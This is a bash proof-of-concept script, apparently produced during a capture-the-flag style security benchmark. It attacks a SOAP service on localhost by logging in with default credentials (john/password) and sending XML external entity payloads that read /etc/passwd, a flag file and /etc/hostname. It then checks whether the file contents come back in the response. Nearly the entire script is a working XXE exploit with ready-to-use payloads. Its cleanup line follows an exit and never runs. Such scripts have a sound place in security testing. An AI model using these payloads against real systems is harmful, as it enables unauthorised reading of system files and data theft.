#!/bin/bash
# POC: XXE Injection POC v3 with improved session handling and redirect following
# Target: ./repo
# Created: 2025-11-05T17:03:51.705Z
# Session: benchmark-XBEN-032-24-mhm7iwy4

# XXE Injection POC for SOAP Service (with proper session handling)
# Demonstrates reading /etc/passwd and flag files via XXE

TARGET="http://localhost"
SOAP_ENDPOINT="$TARGET/soap_service"
LOGIN_ENDPOINT="$TARGET/login"
COOKIE_JAR="/tmp/cookies_xxe_v3.txt"

echo "[*] XXE Injection POC for SOAP Service"
echo "[*] Target: $SOAP_ENDPOINT"
echo ""

# Step 1: Authenticate with proper session handling
echo "[+] Step 1: Authenticating with default credentials (john/password)"
echo "---"

# Login and follow redirects
RESPONSE=$(curl -s -L -c "$COOKIE_JAR" -b "$COOKIE_JAR" -X POST "$LOGIN_ENDPOINT" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=john&password=password')

# Verify session was established
if [ -f "$COOKIE_JAR" ]; then
    echo "[✓] Session cookie saved"
    cat "$COOKIE_JAR" | head -3
else
    echo "[!] Warning: No cookie file created"
fi
echo ""

# Test 1: Read /etc/passwd
echo "[+] Test 1: Reading /etc/passwd via XXE"
echo "---"
PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'

RESPONSE=$(curl -s -L -b "$COOKIE_JAR" -X POST "$SOAP_ENDPOINT" \
  -H 'Content-Type: application/xml' \
  -d "$PAYLOAD")

echo "Response (first 500 chars):"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

# Check if /etc/passwd content is present in response
if echo "$RESPONSE" | grep -q "root:"; then
    echo "[✓] SUCCESS: /etc/passwd contents found in response!"
    PASSWD_SUCCESS=1
else
    echo "[!] /etc/passwd not found in response (checking for XML errors...)"
    if echo "$RESPONSE" | grep -q "xml\|XML\|<"; then
        echo "[*] Response contains XML, checking content..."
        PASSWD_SUCCESS=0
    else
        echo "[!] Response does not appear to be XML"
        PASSWD_SUCCESS=0
    fi
fi
echo ""

# Test 2: Read flag file
echo "[+] Test 2: Reading flag file via XXE"
echo "---"
PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/daytona/repo/app/flag.txt">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'

RESPONSE=$(curl -s -L -b "$COOKIE_JAR" -X POST "$SOAP_ENDPOINT" \
  -H 'Content-Type: application/xml' \
  -d "$PAYLOAD")

echo "Response (first 500 chars):"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

# Check if flag is present
if echo "$RESPONSE" | grep -q "CTF{"; then
    echo "[✓] SUCCESS: Flag found in response!"
    FLAG_SUCCESS=1
else
    echo "[!] Flag pattern not found in response"
    FLAG_SUCCESS=0
fi
echo ""

# Test 3: Alternative XXE payload format (in case the above format doesn't work)
echo "[+] Test 3: Alternative XXE payload format"
echo "---"
PAYLOAD='<?xml version="1.0"?><!DOCTYPE Account [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'

RESPONSE=$(curl -s -L -b "$COOKIE_JAR" -X POST "$SOAP_ENDPOINT" \
  -H 'Content-Type: application/xml' \
  -d "$PAYLOAD")

echo "Response:"
echo "$RESPONSE"
echo ""

# Summary
echo "[*] Summary:"
if [ $PASSWD_SUCCESS -eq 1 ] || [ $FLAG_SUCCESS -eq 1 ]; then
    echo "[✓] XXE Vulnerability Confirmed - File content was successfully exfiltrated"
    exit 0
else
    echo "[!] XXE may still be present but file contents not directly exfiltrated"
    echo "[*] The endpoint may require specific request formats or the files may not be readable"
    exit 0
fi

# Cleanup
rm -f "$COOKIE_JAR"